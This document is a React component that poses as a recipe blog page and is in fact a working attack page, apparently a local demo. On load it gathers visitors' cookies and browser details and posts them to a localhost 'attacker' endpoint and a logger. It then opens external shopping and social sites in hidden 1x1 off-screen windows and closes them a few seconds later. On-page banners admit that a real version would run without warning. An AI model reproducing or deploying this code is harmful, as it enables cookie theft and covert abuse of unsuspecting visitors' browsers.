import axios from "axios";
import { useState, useEffect } from "react";

function App() {
  const [attackStatus, setAttackStatus] = useState("initializing");
  const [redirectCount, setRedirectCount] = useState(0);
  const [capturedPackets, setCapturedPackets] = useState([]);

  // Real external websites to redirect to
  const attackWebsites = [
    "https://www.amazon.com",
    "https://www.flipkart.com", 
    "https://www.ebay.com",
    "https://www.walmart.com",
    "https://www.target.com",
    "https://www.etsy.com",
    "https://www.aliexpress.com",
    "https://www.bestbuy.com",
    "https://www.runvay.co.in",
    "https://www.instagram.com",
    "https://www.facebook.com",
    "https://www.twitter.com",
    "https://www.linkedin.com",
    "https://www.youtube.com",
    "https://www.reddit.com"
  ];

  // Network packet capture simulation
  const captureNetworkPacket = (url, method, data) => {
    const packet = {
      timestamp: new Date().toISOString(),
      url: url,
      method: method,
      data: data,
      userAgent: navigator.userAgent,
      cookies: document.cookie,
      ip: "::1", // Simulated IP
      size: JSON.stringify(data).length,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': navigator.userAgent,
        'Referer': window.location.href
      }
    };
    
    setCapturedPackets(prev => [...prev, packet]);
    console.log("📡 CAPTURED PACKET:", packet);
    
    // Send packet to logger for analysis
    fetch('http://localhost:6000/packet-capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(packet)
    }).catch(err => console.log('Packet logging failed:', err));
  };

  // Automatic attack triggering on page load
  useEffect(() => {
    const initiateAutomaticAttack = async () => {
      setAttackStatus("collecting_data");
      
      // Collect initial user data
      const userData = {
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        timestamp: new Date().toISOString(),
        url: window.location.href,
        event: 'automatic_attack_initiated'
      };

      // Capture initial packet
      captureNetworkPacket('http://localhost:5173', 'PAGE_LOAD', userData);

      // Send initial data to attacker
      try {
        await fetch('http://localhost:5001/automatic-init', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(userData)
        });
        
        captureNetworkPacket('http://localhost:5001/automatic-init', 'POST', userData);
      } catch (error) {
        console.log('Initial attack failed:', error);
      }

      // Start automatic redirect sequence
      setAttackStatus("redirecting");
      await executeAutomaticRedirects();
    };

    initiateAutomaticAttack();
  }, []);

  // Execute automatic redirects to multiple external websites
  const executeAutomaticRedirects = async () => {
    // Select 6 random websites from the list
    const selectedWebsites = [];
    const shuffled = [...attackWebsites].sort(() => 0.5 - Math.random());
    selectedWebsites.push(...shuffled.slice(0, 6));

    for (let i = 0; i < selectedWebsites.length; i++) {
      const url = selectedWebsites[i];
      const domain = url.replace('https://www.', '').replace('https://', '').split('.')[0];
      
      setAttackStatus(`redirecting_to_${domain}`);
      setRedirectCount(i + 1);

      // Collect data for this redirect
      const redirectData = {
        cookies: document.cookie,
        userAgent: navigator.userAgent,
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        timestamp: new Date().toISOString(),
        redirectNumber: i + 1,
        totalRedirects: selectedWebsites.length,
        domain: domain,
        url: url
      };

      // Capture the redirect packet
      captureNetworkPacket(url, 'REDIRECT', redirectData);

      try {
        // Open external website in new tab (stealth mode)
        const attackWindow = window.open(url, '_blank', 'width=1,height=1,left=-1000,top=-1000');
        
        // Send data to logger server (since we can't POST to external sites)
        await fetch('http://localhost:6000/external-redirect', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            ...redirectData,
            action: 'external_redirect',
            external_url: url
          })
        });

        // Close the stealth window after 3 seconds (give it time to load)
        setTimeout(() => {
          if (attackWindow) attackWindow.close();
        }, 3000);

        // Wait before next redirect
        await new Promise(resolve => setTimeout(resolve, 2000));
        
      } catch (error) {
        console.log(`Redirect to ${url} failed:`, error);
      }
    }

    setAttackStatus("completed");
  };

  return (
    <div style={{padding:"40px"}}>
      <h1>Recipe Blog</h1>
      <p>This page summarizes cooking recipes and provides various tools.</p>
      
      {/* Attack Status Display */}
      <div style={{marginBottom: "20px", padding: "15px", backgroundColor: "#fff3cd", borderRadius: "5px", border: "1px solid #ffeaa7"}}>
        <h4 style={{margin: "0 0 10px 0", color: "#856404"}}>🚨 Automatic Attack Status</h4>
        <div style={{fontSize: "14px", color: "#856404"}}>
          <strong>Status:</strong> {attackStatus.replace(/_/g, ' ').toUpperCase()}<br/>
          <strong>Redirects Completed:</strong> {redirectCount}/{attackWebsites.length}<br/>
          <strong>Packets Captured:</strong> {capturedPackets.length}
        </div>
      </div>

      {/* Network Packet Capture Display */}
      {capturedPackets.length > 0 && (
        <div style={{marginBottom: "20px", padding: "15px", backgroundColor: "#d1ecf1", borderRadius: "5px", border: "1px solid #bee5eb"}}>
          <h4 style={{margin: "0 0 10px 0", color: "#0c5460"}}>📡 Captured Network Packets</h4>
          <div style={{maxHeight: "200px", overflowY: "auto", fontSize: "12px"}}>
            {capturedPackets.slice(-5).map((packet, index) => (
              <div key={index} style={{marginBottom: "5px", padding: "5px", backgroundColor: "#fff", borderRadius: "3px"}}>
                <strong>{packet.timestamp}</strong> - {packet.method} to {packet.url}<br/>
                Size: {packet.size} bytes | IP: {packet.ip}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Original Recipe Cards (now decorative) */}
      <div style={{display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(280px, 1fr))", gap: "20px", marginTop: "30px"}}>
        {[
          { id: 1, name: "Recipe Analysis", icon: "📊" },
          { id: 2, name: "Nutrition Calculator", icon: "🥗" },
          { id: 3, name: "Cooking Tips", icon: "👨‍🍳" },
          { id: 4, name: "Ingredient Scanner", icon: "🔍" },
          { id: 5, name: "Meal Planner", icon: "📅" },
          { id: 6, name: "Recipe Sharing", icon: "📤" }
        ].map(link => (
          <div 
            key={link.id} 
            style={{ 
              border: "1px solid #ddd", 
              borderRadius: "8px", 
              padding: "20px", 
              backgroundColor: "#f8f9fa",
              opacity: 0.7,
              position: "relative"
            }}
          >
            <div style={{fontSize: "40px", marginBottom: "10px"}}>{link.icon}</div>
            <h3 style={{margin: "0 0 10px 0", color: "#333"}}>{link.name}</h3>
            <p style={{margin: "0", color: "#666", fontSize: "14px"}}>Feature automatically executed</p>
            
            <div style={{
              position: "absolute",
              top: "10px",
              right: "10px",
              fontSize: "12px",
              color: "#28a745"
            }}>
              ✓ Auto-executed
            </div>
          </div>
        ))}
      </div>

      {/* Attack Complete Message */}
      {attackStatus === "completed" && (
        <div style={{marginTop: "40px", padding: "20px", backgroundColor: "#d4edda", borderRadius: "8px", border: "1px solid #c3e6cb"}}>
          <h4 style={{margin: "0 0 10px 0", color: "#155724"}}>✅ External Website Attack Complete</h4>
          <p style={{margin: "0", color: "#155724", fontSize: "14px"}}>
            All {redirectCount} external websites have been automatically opened in stealth mode and network packets have been captured. 
            Check the logger server for external redirect logs.
          </p>
        </div>
      )}

      <div style={{marginTop: "40px", padding: "20px", backgroundColor: "#f8d7da", borderRadius: "8px", border: "1px solid #f5c6cb"}}>
        <h4 style={{margin: "0 0 10px 0", color: "#721c24"}}>⚠️ External Website Attack Alert</h4>
        <p style={{margin: "0", color: "#721c24", fontSize: "14px"}}>
          This page has automatically opened external websites (Amazon, Flipkart, etc.) and captured network packets. 
          In a real attack, this would happen invisibly without any warning messages.
        </p>
        <div style={{marginTop: "10px", fontSize: "12px", color: "#721c24"}}>
          <strong>External sites opened:</strong> Amazon, Flipkart, eBay, Walmart, Target, Etsy, AliExpress, BestBuy, RunVay, Instagram, Facebook, Twitter, LinkedIn, YouTube, Reddit
        </div>
      </div>
    </div>
  );
}

export default App;
